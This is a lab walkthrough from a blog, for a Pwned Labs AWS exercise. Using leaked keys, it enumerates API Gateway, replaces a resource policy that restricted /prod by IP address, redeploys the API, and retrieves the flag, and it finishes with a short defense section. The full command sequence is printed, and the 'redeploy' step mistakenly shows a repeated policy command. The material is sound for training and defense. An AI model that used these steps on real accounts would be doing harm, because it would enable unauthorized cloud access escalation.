---
title: Bypass Restrictions in API Gateway
description: Bypass Restrictions in API Gateway
image:
  path: aws.jpg
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
As part of a red team engagement, we have gained access to several AWS CodeCommit repositories. In one of the repositories we found hardcoded AWS access keys and a development API endpoint. Can you use this to compromise more than the development environment, and help increase our access?

# Walkthrough
We are given Dev API URL: `https://u1hp5d8r0b.execute-api.us-west-2.amazonaws.com/api/dev`. The URL is the API Gateway hostname, and it contains three key parts:
- `u1hp5d8r0b` : The API Gateway ID that uniquely identifies your API Gateway instance in AWS.
- `execute-api` : AWS’s domain used for API Gateway endpoints.
- `us-west-2`: The AWS region where this API Gateway is deployed — in this case, Oregon.
- `amazonaws.com`: AWS’s root domain.

`/api/dev/` forms the resource path, which typically represents `/resource/operation`, but this can vary depending on the individual implementation.

Get the API [stage](https://docs.aws.amazon.com/apigateway/latest/developerguide/http-api-stages.html) name:
```
└─$ aws apigateway get-stages --rest-api-id  u1hp5d8r0b
{
    "item": [
        {
            "deploymentId": "g4zdv6",
            "stageName": "api",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "variables": {},
            "tracingEnabled": false,
            "createdDate": 1757009973,
            "lastUpdatedDate": 1757009973
        }
    ]
}

```

The stage name is `api` , and the "resource" `dev` representing the environment.

Let's start assessing the API. First, we check the discovered API with a `GET/POST` requests to check if any of these methods are allowed
```
└─$ curl -i https://u1hp5d8r0b.execute-api.us-west-2.amazonaws.com/api/dev -X GET
HTTP/2 405 
content-type: application/json
content-length: 32
date: Thu, 04 Sep 2025 18:46:46 GMT
x-amz-apigw-id: QY-3mHnvPHcEbvg=
x-amzn-requestid: a633b644-e78b-4fc7-972c-4a9cabc4907b
x-cache: Error from cloudfront
via: 1.1 42deb4754a5439a360d5489b705a1ee6.cloudfront.net (CloudFront)
x-amz-cf-pop: WAW51-P6
x-amz-cf-id: GxPQ2Nw8hF_hnArqI7kkJRnGSeBMYRyNIjmW4pOBLd66P9PwqbIUBw==

{"message":"Method Not Allowed"}      
```
```
└─$ curl -i https://u1hp5d8r0b.execute-api.us-west-2.amazonaws.com/api/dev -X POST
HTTP/2 405 
content-type: application/json
content-length: 32
date: Thu, 04 Sep 2025 18:47:02 GMT
x-amz-apigw-id: QY-6GEATvHcEREA=
x-amzn-requestid: 50bd4200-d4db-4187-9ced-8ea8b04bbebc
x-cache: Error from cloudfront
via: 1.1 3964640e0d939153c8e70773075c0788.cloudfront.net (CloudFront)
x-amz-cf-pop: WAW51-P6
x-amz-cf-id: TwxZl3txyQuE-S0Wqlro4bJVuz0Yy0M_x6rVNrPEt-5qI5FeLxl3eA==

{"message":"Method Not Allowed"} 
```

Both methods aren't allowed. Let's check `OPTIONS` method
```
└─$ curl -i https://u1hp5d8r0b.execute-api.us-west-2.amazonaws.com/api/dev -X OPTIONS
HTTP/2 200 
content-type: application/json
content-length: 0
date: Thu, 04 Sep 2025 18:53:41 GMT
access-control-allow-methods: PATCH, OPTIONS
x-amzn-requestid: 591b53ea-f2ec-4fe9-a31c-061082bd733f
access-control-allow-origin: *
access-control-allow-headers: Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token,X-Amz-User-Agent
x-amz-apigw-id: QY_4YE_5PHcEVLg=
x-cache: Miss from cloudfront
via: 1.1 5c4bebe08b1216abee7b8946e52747c4.cloudfront.net (CloudFront)
x-amz-cf-pop: HEL51-P7
x-amz-cf-id: SekIrijX12Xh0N3UBkEo9W1v66UGEe_98D8GhCcym4mSOVVH7PcTXg==

```

We see that `PATCH` method allowed, let's try it
```
└─$ curl -i https://u1hp5d8r0b.execute-api.us-west-2.amazonaws.com/api/dev -X PATCH  
HTTP/2 500 
content-type: application/json
content-length: 239
date: Thu, 04 Sep 2025 18:54:25 GMT
x-amz-apigw-id: QY__WHwvPHcEGjA=
x-amzn-requestid: 558dcc7b-b260-4bd5-9fe1-4f56527c45e1
x-cache: Error from cloudfront
via: 1.1 472cf725ba42426edb1a574fca923542.cloudfront.net (CloudFront)
x-amz-cf-pop: HEL51-P7
x-amz-cf-id: s_5lCB02-lOYAVi-YGgFqn9vs9OsauqDxWDqW8D3ffgodaehgae4OA==

{"status":500,"error":"Dev Environment Misconfiguration","message":"The development environment is currently unavailable due to unexpected maintenance. Our team is actively working to restore service. Please try your request again later."}  
```

We receive `500 Internal Error`, meaning that `dev` environment is down. This could indicate that there might be other environments as well. Thus, we can try to access the `prod` environment
```
└─$ curl -i https://u1hp5d8r0b.execute-api.us-west-2.amazonaws.com/api/prod -X GET    
HTTP/2 403 
content-type: application/json
content-length: 158
date: Thu, 04 Sep 2025 19:31:16 GMT
x-amz-apigw-id: QZFY0GF8PHcEDJg=
x-amzn-requestid: 58831b0a-0d67-41b1-bc04-4b83051ce458
x-amzn-errortype: AccessDeniedException
x-cache: Error from cloudfront
via: 1.1 e491995f66315775a90fd3554512b836.cloudfront.net (CloudFront)
x-amz-cf-pop: HEL51-P7
x-amz-cf-id: 6C4MnjgFIPY51i47vWqo1FnOZOoJ6n8U2sWHdxXWUBAj8VgLH451VA==

{"Message":"User: anonymous is not authorized to perform: execute-api:Invoke on resource: arn:aws:execute-api:us-west-2:********7089:u1hp5d8r0b/api/GET/prod"} 
```

We receive `403 Forbidden`. According to [blog](https://www.wolfe.id.au/2023/11/12/avoid-accidental-exposure-of-authenticated-amazon-api-gateway-resources/), this restriction is something related to the `Resource Policy` attached to the API.

We were given AWS credentials, let's authenticate to see if the principal have access to API
```
└─$ aws sts get-caller-identity                        
{
    "UserId": "AIDA3FNN2GFA3YKUIPRXB",
    "Account": "767553057089",
    "Arn": "arn:aws:iam::767553057089:user/staging_eng"
}
```

Let's check if our principal can list any APIs
```
└─$ aws apigateway get-rest-apis
{
    "items": [
        {
            "id": "u1hp5d8r0b",
            "name": "APIGatewayDev",
            "description": "API prototype for new service",
            "createdDate": 1757009971,
            "apiKeySource": "HEADER",
            "endpointConfiguration": {
                "types": [
                    "EDGE"
                ],
                "ipAddressType": "ipv4"
            },
            "policy": "{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":\\\"*\\\",\\\"Action\\\":\\\"execute-api:Invoke\\\",\\\"Resource\\\":\\\"arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b\\/*\\/GET\\/prod\\\",\\\"Condition\\\":{\\\"IpAddress\\\":{\\\"aws:SourceIp\\\":\\\"172.16.5.10\\\"}}},{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":\\\"*\\\",\\\"Action\\\":\\\"execute-api:Invoke\\\",\\\"Resource\\\":\\\"arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b\\/*\\/*\\/dev\\\"}]}",
            "disableExecuteApiEndpoint": false,
            "rootResourceId": "e93b29y4ne"
        }
    ]
}

```

We see a resource policy attached to the APIGatewayDev API. To make it readable, let's beatify it
```
└─$ cat policy.json | sed 's/\\\\\\//g' | jq
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "execute-api:Invoke",
      "Resource": "arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b\\/*\\/GET\\/prod",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "172.16.5.10"
        }
      }
    },
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "execute-api:Invoke",
      "Resource": "arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b\\/*\\/*\\/dev"
    }
  ]
}

```


The policy applies a condition to accessing `prod` API where the Source IP address should be `172.16.5.10`. The [documentation](https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-resource-policies.html) states that it's possible to implement a source IP based restriction on the API.

To bypass it, we can try removing this restriction, but we must have permissions to do so. Let's see if there is an attached policy
```
└─$ aws iam list-attached-user-policies --user-name staging_eng
{
    "AttachedPolicies": [
        {
            "PolicyName": "staging_engineer_policy",
            "PolicyArn": "arn:aws:iam::767553057089:policy/staging_engineer_policy"
        }
    ]
}
```

We find one, so let's examine it
```
└─$ aws iam get-policy --policy-arn arn:aws:iam::767553057089:policy/staging_engineer_policy
{
    "Policy": {
        "PolicyName": "staging_engineer_policy",
        "PolicyId": "ANPA3FNN2GFA7TI2ORVN5",
        "Arn": "arn:aws:iam::767553057089:policy/staging_engineer_policy",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Policy staging engineer account",
        "CreateDate": "2025-09-04T18:19:30Z",
        "UpdateDate": "2025-09-04T18:19:30Z",
        "Tags": []
    }
}

```

It has only v1 version, so let's check it
```
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::767553057089:policy/staging_engineer_policy --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "apigateway:POST",
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*/deployments"
                },
                {
                    "Action": [
                        "apigateway:GET",
                        "apigateway:PATCH"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:apigateway:us-west-2::/restapis",
                        "arn:aws:apigateway:us-west-2::/restapis/*"
                    ]
                },
                {
                    "Action": "apigateway:UpdateRestApiPolicy",
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                },
                {
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-09-04T18:19:30Z"
    }
}

```

We have permissions to enumerate the APIs and redeploy them with any configuration changes. The `apigateway:UpdateRestApiPolicy` permission allows the user to update the resource policy attached to any REST API (`/restapis/*`) in `us-west-2`. Resource policies define who can access the resource and under what conditions, providing granular control for any resource. 

According to documentation for [UpdateRestApi](https://docs.aws.amazon.com/apigateway/latest/api/patch-operations.html#UpdateRestApi-Patch), we can replace the existing API Gateway resource policy

![](bypass-restrictions-in-api-gateway-1.png)

Let's modify the policy by allowing unconditional access to the `/prod`
```
└─$ cat policy.json                         
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "execute-api:Invoke",
      "Resource": "arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b/*/GET/prod"
    },
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "execute-api:Invoke",
      "Resource": "arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b/*/*/dev"
    }
  ]
}

```

Escape the quotas and run the command to ,odify the policy
```
└─$ aws apigateway update-rest-api --rest-api-id u1hp5d8r0b --patch-operations '[{"op":"replace","path":"/policy","value":"{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"execute-api:Invoke\",\"Resource\":\"arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b/*/GET/prod\"},{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"execute-api:Invoke\",\"Resource\":\"arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b/*/*/dev\"}]}"}]'

{
    "id": "u1hp5d8r0b",
    "name": "APIGatewayDev",
    "description": "API prototype for new service",
    "createdDate": 1757009971,
    "apiKeySource": "HEADER",
    "endpointConfiguration": {
        "types": [
            "EDGE"
        ],
        "ipAddressType": "ipv4"
    },
    "policy": "{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":\\\"*\\\",\\\"Action\\\":\\\"execute-api:Invoke\\\",\\\"Resource\\\":\\\"arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b\\/*\\/GET\\/prod\\\"},{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":\\\"*\\\",\\\"Action\\\":\\\"execute-api:Invoke\\\",\\\"Resource\\\":\\\"arn:aws:execute-api:us-west-2:767553057089:u1hp5d8r0b\\/*\\/*\\/dev\\\"}]}",
    "tags": {},
    "disableExecuteApiEndpoint": false,
    "rootResourceId": "e93b29y4ne"
}

```

We will still receive error
```
└─$ curl -i https://u1hp5d8r0b.execute-api.us-west-2.amazonaws.com/api/prod -X GET

HTTP/2 403 
content-type: application/json
content-length: 158
date: Thu, 04 Sep 2025 20:04:36 GMT
x-amz-apigw-id: QZKRUGQavHcEbCQ=
x-amzn-requestid: 12f92984-8492-4981-947d-3042b4a981bf
x-amzn-errortype: AccessDeniedException
x-cache: Error from cloudfront
via: 1.1 a8dd9e9343adef1e56ef851739036fec.cloudfront.net (CloudFront)
x-amz-cf-pop: WAW51-P6
x-amz-cf-id: DTpetnJIj8zSWasbbZY9riqAffhhQt1l_vNUkP7YHmg14kw0-R0lPg==

{"Message":"User: anonymous is not authorized to perform: execute-api:Invoke on resource: arn:aws:execute-api:us-west-2:********7089:u1hp5d8r0b/api/GET/prod"} 
```

According to [documentation](https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-deploy-api.html), we need to redeploy API to existing stage or to the new one

So let’s redeploy our existing API `u1hp5d8r0b` to the api stage with the command below. We have the permission to redeploy the API.
```
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::767553057089:policy/staging_engineer_policy --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "apigateway:POST",
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*/deployments"
                }
<SNIP>
```

We successfully deployed the api
```
└─$ aws apigateway create-deployment --rest-api-id u1hp5d8r0b --stage-name api
{
    "id": "5qt9d1",
    "createdDate": 1757016418
}

```

After few minutes, we can access private API
```
└─$ curl -i https://u1hp5d8r0b.execute-api.us-west-2.amazonaws.com/api/prod -X GET
HTTP/2 200 
content-type: application/json
content-length: 44
date: Thu, 04 Sep 2025 20:08:00 GMT
x-amz-apigw-id: QZKxEGffvHcEk3Q=
x-amzn-requestid: 5392de4e-b720-4a51-a8ee-61e2ed4fb56f
x-cache: Miss from cloudfront
via: 1.1 faded4be268a2e5dabdea502f8082260.cloudfront.net (CloudFront)
x-amz-cf-pop: WAW51-P6
x-amz-cf-id: kByI8gjGmm8lQSf-HrXQwDaIMKLsLdFB0kmE1jZV9GfAlhipKNb5CQ==

{"flag": "<REDACTED>"}

```

# Defense
Based on lab's [Defense](https://pwnedlabs.io/labs/bypass-restrictions-in-api-gateway) section.

- Review permissions and policies
- Assume that a threat actor with a foothold in AWS may be able to increase their access at the application, service or account level. 
- Enable CloudTrail logging in AWS to identify potentially malicious API Gateway activity. 
- CloudWatch alarms can be created to alert defender on behavior that is suspicious or that deviates from normal patterns of behaviour. 